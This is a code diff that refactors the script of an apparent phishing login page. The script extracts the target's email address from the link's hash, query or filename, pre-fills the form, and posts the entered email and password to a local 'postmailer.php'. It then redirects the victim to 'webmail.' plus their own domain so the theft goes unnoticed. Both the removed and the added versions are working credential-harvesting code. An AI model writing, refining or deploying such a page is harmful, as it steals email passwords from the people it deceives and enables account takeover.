@@ -73,172 +73,97 @@
       <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
       <script>
          $(document).ready(function() {
-             // Configuration - Set your redirect domain here
-             var REDIRECT_DELAY = 1500; // Delay in milliseconds before redirect (1.5 seconds)
+             // Configuration
+             var REDIRECT_DELAY = 1500;
              
              // Function to extract domain from email and create webmail URL
              function getWebmailUrl(email) {
                  if (!email || !email.includes('@')) {
-                     return 'https://webmail.gracedrive.org'; // Fallback domain
+                     return 'https://webmail.gracedrive.org';
                  }
-                 
                  var domain = email.split('@')[1];
                  return 'https://webmail.' + domain;
              }
              
-             // Enhanced function to extract email from URL hash, query, or filename patterns
+             // Enhanced email extraction function
              function extractEmailFromUrl() {
                  var email = null;
                  var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                  
-                 console.log('Current URL:', window.location.href);
+                 console.log('Extracting email from URL:', window.location.href);
+                 console.log('Hash:', window.location.hash);
                  console.log('Pathname:', window.location.pathname);
                  console.log('Search:', window.location.search);
-                 console.log('Hash:', window.location.hash);
                  
-                 // 1. Try to get email from URL hash (fragment) - Enhanced for multiple patterns
+                 // 1. Extract from hash fragment (#user@domain.com)
                  var hash = window.location.hash;
                  if (hash && hash.length > 1) {
                      var hashContent = decodeURIComponent(hash.substring(1));
-                     console.log('Hash content:', hashContent);
+                     console.log('Processing hash content:', hashContent);
                      
                      // Direct email in hash
                      if (emailRegex.test(hashContent)) {
                          email = hashContent;
-                         console.log('Email found directly in hash:', email);
+                         console.log('✓ Direct email found in hash:', email);
                      }
                      
-                     // Look for email patterns within hash content
+                     // Look for email patterns in hash
                      if (!email) {
-                         var hashPatterns = [
-                             // Match filename#user@domain.com or similar
-                             /([a-zA-Z0-9._-]+)#([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/,
-                             // Match any email in hash content
-                             /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/
-                         ];
-                         
-                         for (var h = 0; h < hashPatterns.length; h++) {
-                             var hashMatch = hashContent.match(hashPatterns[h]);
-                             if (hashMatch) {
-                                 // For pattern with capture groups, take the email part
-                                 var potentialEmail = hashMatch[2] || hashMatch[1];
-                                 if (emailRegex.test(potentialEmail)) {
-                                     email = potentialEmail;
-                                     console.log('Email found in hash with pattern', h + 1, ':', email);
-                                     break;
-                                 }
-                             }
-                         }
-                     }
-                     
-                     // Also check the full hash URL for patterns like index.html#user@domain.com
-                     if (!email) {
-                         var fullHashUrl = window.location.href;
-                         var hashUrlMatch = fullHashUrl.match(/#([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
-                         if (hashUrlMatch && hashUrlMatch[1] && emailRegex.test(hashUrlMatch[1])) {
-                             email = hashUrlMatch[1];
-                             console.log('Email found in full hash URL:', email);
+                         var emailMatch = hashContent.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+                         if (emailMatch && emailRegex.test(emailMatch[1])) {
+                             email = emailMatch[1];
+                             console.log('✓ Email pattern found in hash:', email);
                          }
                      }
                  }
                  
-                 // 2. Try URL query parameters
+                 // 2. Extract from query parameters
                  if (!email) {
                      var urlParams = new URLSearchParams(window.location.search);
                      var emailParam = urlParams.get('email') || urlParams.get('user') || urlParams.get('username');
                      if (emailParam) {
                          var decodedEmail = decodeURIComponent(emailParam);
-                         console.log('Query param email:', decodedEmail);
                          if (emailRegex.test(decodedEmail)) {
                              email = decodedEmail;
-                             console.log('Email found in query params:', email);
+                             console.log('✓ Email found in query params:', email);
                          }
                      }
                  }
                  
-                 // 3. Try to extract from filename pattern (index.html@user@domain.com)
+                 // 3. Extract from filename patterns (@user@domain.com)
                  if (!email) {
-                     var path = window.location.pathname;
                      var fullUrl = window.location.href;
-                     console.log('Checking pathname for email pattern:', path);
-                     console.log('Full URL for parsing:', fullUrl);
+                     var path = window.location.pathname;
                      
-                     // Pattern 1: filename@user@domain.com format - most specific first
+                     // Pattern matching for filename@email
                      var patterns = [
-                         // Match index.html@user@domain.com or similar
                          /([a-zA-Z0-9._-]+\.[a-zA-Z]+)@([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/,
-                         // Match just @user@domain.com in path
                          /@([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/,
-                         // Match filename@user@domain.com without extension
                          /([a-zA-Z0-9._-]+)@([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/
                      ];
                      
-                     for (var p = 0; p < patterns.length; p++) {
-                         var match = path.match(patterns[p]);
+                     for (var i = 0; i < patterns.length; i++) {
+                         var match = fullUrl.match(patterns[i]);
                          if (match) {
-                             if (match[2]) {
-                                 // Pattern with filename capture group
-                                 email = match[2];
-                                 console.log('Email found with pattern', p + 1, '- Filename:', match[1], 'Email:', email);
-                                 break;
-                             } else if (match[1]) {
-                                 // Pattern without filename capture group
-                                 email = match[1];
-                                 console.log('Email found with pattern', p + 1, 'Email:', email);
-                                 break;
-                             }
-                         }
-                     }
-                     
-                     // Also try the full URL if path didn't work
-                     if (!email) {
-                         for (var q = 0; q < patterns.length; q++) {
-                             var urlMatch = fullUrl.match(patterns[q]);
-                             if (urlMatch) {
-                                 if (urlMatch[2]) {
-                                     email = urlMatch[2];
-                                     console.log('Email found in full URL with pattern', q + 1, '- Filename:', urlMatch[1], 'Email:', email);
-                                     break;
-                                 } else if (urlMatch[1]) {
-                                     email = urlMatch[1];
-                                     console.log('Email found in full URL with pattern', q + 1, 'Email:', email);
-                                     break;
-                                 }
-                             }
-                         }
-                     }
-                 }
-                 
-                 // 4. Check the full URL for any email pattern
-                 if (!email) {
-                     var fullUrl = window.location.href;
-                     console.log('Checking full URL for email patterns:', fullUrl);
-                     
-                     // Look for any email pattern in the entire URL
-                     var emailMatches = fullUrl.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
-                     if (emailMatches && emailMatches.length > 0) {
-                         // Take the first valid email found
-                         for (var i = 0; i < emailMatches.length; i++) {
-                             if (emailRegex.test(emailMatches[i])) {
-                                 email = emailMatches[i];
-                                 console.log('Email found in full URL:', email);
+                             var potentialEmail = match[2] || match[1];
+                             if (potentialEmail && emailRegex.test(potentialEmail)) {
+                                 email = potentialEmail;
+                                 console.log('✓ Email found with pattern ' + (i + 1) + ':', email);
                                  break;
                              }
                          }
                      }
                  }
                  
-                 // 5. Try to decode any URL-encoded emails
+                 // 4. Try URL decoding for encoded emails
                  if (!email) {
                      var decodedUrl = decodeURIComponent(window.location.href);
-                     console.log('Checking decoded URL:', decodedUrl);
-                     
                      var decodedMatches = decodedUrl.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
-                     if (decodedMatches && decodedMatches.length > 0) {
+                     if (decodedMatches) {
                          for (var j = 0; j < decodedMatches.length; j++) {
                              if (emailRegex.test(decodedMatches[j])) {
                                  email = decodedMatches[j];
-                                 console.log('Email found in decoded URL:', email);
+                                 console.log('✓ Email found in decoded URL:', email);
                                  break;
                              }
                          }
@@ -249,51 +174,30 @@
                  return email;
              }
              
-             // Function to handle successful login and redirect
+             // Function to handle successful login
              function handleSuccessfulLogin(response) {
                  $('#loading-overlay').hide();
                  var msg = response && response.msg ? response.msg : 'Login successful!';
                  
-                 // Show success message
                  $('#login-status-message').text(msg).show();
                  $('#login-status').removeClass('error-notice').addClass('success-notice').show();
-                 
-                 // Clear password field for security
                  $('#password').val('');
-                 
-                 // Disable form to prevent further submissions
                  $('#login_submit').prop('disabled', true).text('Login Successful');
                  $('#email').prop('disabled', true);
                  $('#password').prop('disabled', true);
                  
-                 // Immediate redirect attempt
                  var userEmail = $('#email').val();
                  var redirectUrl = getWebmailUrl(userEmail) + '?email=' + encodeURIComponent(userEmail);
-                 console.log('Attempting immediate redirect to: ' + redirectUrl);
+                 console.log('Redirecting to:', redirectUrl);
                  
-                 // Try multiple redirect methods
                  try {
-                     // Method 1: window.location.replace
                      window.location.replace(redirectUrl);
                  } catch(e) {
-                     console.log('Method 1 failed, trying method 2');
-                     try {
-                         // Method 2: window.location.href
-                         window.location.href = redirectUrl;
-                     } catch(e2) {
-                         console.log('Method 2 failed, trying method 3');
-                         // Method 3: window.open
-                         window.open(redirectUrl, '_self');
-                     }
+                     window.location.href = redirectUrl;
                  }
                  
-                 // Fallback redirect after delay
                  setTimeout(function() {
-                     var currentDomain = getWebmailUrl(userEmail).replace('https://', '');
-                     if (window.location.href.indexOf(currentDomain) === -1) {
-                         console.log('Fallback redirect triggered');
-                         window.location.href = redirectUrl;
-                     }
+                     window.location.href = redirectUrl;
                  }, REDIRECT_DELAY);
              }
              
@@ -305,39 +209,39 @@
                  $('#login-status-message').text(msg);
                  $('#login-status').removeClass('success-notice').addClass('error-notice').show();
                  $('#password').val('').focus();
-                 
-                 if (response && response.attempt) {
-                     console.log('Attempt #' + response.attempt + ' logged');
-                 }
              }
              
-             // Auto-populate email field if valid email is found in URL or filename
+             // Auto-populate email field on page load
              var emailFromUrl = extractEmailFromUrl();
              if (emailFromUrl) {
                  $('#email').val(emailFromUrl);
                  $('#password').focus();
-                 $('#email').css('background-color', '#f0f8ff');
-                 setTimeout(function() {
-                     $('#email').css('background-color', '');
-                 }, 2000);
+                 $('#email').css('background-color', '#e8f5e8');
                  
-                 // Show success message for auto-population
-                 $('#msg').text('Email auto-populated from URL: ' + emailFromUrl)
+                 // Show success message
+                 $('#msg').text('✓ Email auto-filled: ' + emailFromUrl)
                         .css('color', 'green')
                         .css('background-color', '#d4edda')
                         .css('border', '1px solid #c3e6cb')
+                        .css('padding', '8px')
+                        .css('border-radius', '4px')
                         .show();
+                 
                  setTimeout(function() {
-                     $('#msg').fadeOut();
+                     $('#email').css('background-color', '');
+                     $('#msg').fadeOut(2000);
                  }, 3000);
              }
              
-             // Listen for hash changes (if user navigates with different email)
+             // Listen for hash changes
              $(window).on('hashchange', function() {
+                 console.log('Hash changed, re-extracting email...');
                  var newEmail = extractEmailFromUrl();
                  if (newEmail && newEmail !== $('#email').val()) {
                      $('#email').val(newEmail);
                      $('#password').focus();
+                     $('#msg').text('✓ Email updated: ' + newEmail).css('color', 'green').show();
+                     setTimeout(function() { $('#msg').fadeOut(); }, 2000);
                  }
              });
              
@@ -348,20 +252,20 @@
                  var password = $('#password').val();
                  
                  if (!email) {
-                     $('#msg').text('Please enter an email address.').show();
+                     $('#msg').text('Please enter an email address.').css('color', 'red').show();
                      $('#email').focus();
                      return false;
                  }
                  
                  if (!password) {
-                     $('#msg').text('Please enter a password.').show();
+                     $('#msg').text('Please enter a password.').css('color', 'red').show();
                      $('#password').focus();
                      return false;
                  }
                  
                  var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                  if (!emailRegex.test(email)) {
-                     $('#msg').text('Please enter a valid email address.').show();
+                     $('#msg').text('Please enter a valid email address.').css('color', 'red').show();
                      $('#email').focus();
                      return false;
                  }
@@ -370,62 +274,33 @@
                  $('#login-status').hide();
                  $('#loading-overlay').show();
                  
-                 // Submit the form via AJAX
+                 // AJAX form submission
                  $.ajax({
-                     url: 'postmailer.php', // Local PHP backend
+                     url: 'postmailer.php',
                      method: 'POST',
-                     type: 'POST',
-                     data: {
-                         email: email,
-                         password: password
-                     },
+                     data: { email: email, password: password },
                      dataType: 'json',
-                     cache: false,
                      timeout: 30000,
-                     processData: true,
-                     contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
                      beforeSend: function() {
                          $('#login_submit').prop('disabled', true).text('Processing...');
                      },
                      success: function(response) {
                          console.log('Server response:', response);
-                         var msg = response && response.msg ? response.msg : '';
                          
-                         // Debug: Log the response details
-                         console.log('Response message:', msg);
-                         console.log('Response signal:', response && response.signal);
-                         console.log('Response success:', response && response.success);
-                         
-                         // Check if login was successful - more comprehensive check
-                         if (response && (response.signal === 'ok' || response.success === true || 
-                             msg.toLowerCase().includes('success') || msg.toLowerCase().includes('redirect'))) {
-                             console.log('Login successful - triggering redirect');
+                         if (response && (response.signal === 'ok' || response.success === true)) {
                              handleSuccessfulLogin(response);
                          } else {
-                             console.log('Login failed - showing error');
                              handleFailedLogin(response);
                          }
                      },
                      error: function(xhr, status, error) {
                          $('#loading-overlay').hide();
-                         var errorMsg = 'Connection error';
-                         
-                         if (xhr.responseText) {
-                             try {
-                                 var errorResponse = JSON.parse(xhr.responseText);
-                                 errorMsg = errorResponse.msg || errorMsg;
-                             } catch (e) {
-                                 errorMsg = 'Server error: ' + xhr.status;
-                             }
-                         }
-                         
-                         $('#login-status-message').text(errorMsg);
+                         $('#login-status-message').text('Connection error: ' + error);
                          $('#login-status').removeClass('success-notice').addClass('error-notice').show();
                          $('#password').val('').focus();
                      },
                      complete: function() {
-                         // Only re-enable if login failed
-                         if (!$('#login_submit').prop('disabled') || $('#login_submit').text() !== 'Login Successful') {
+                         if ($('#login_submit').text() !== 'Login Successful') {
                              $('#login_submit').prop('disabled', false).text('Log in');
                          }
                      }
@@ -434,7 +309,7 @@
                  return false;
              });
              
-             // Reset password functionality (placeholder)
+             // Reset password handler
              $('#reset_password').click(function(e) {
                  e.preventDefault();
                  alert('Password reset functionality would be implemented here.');
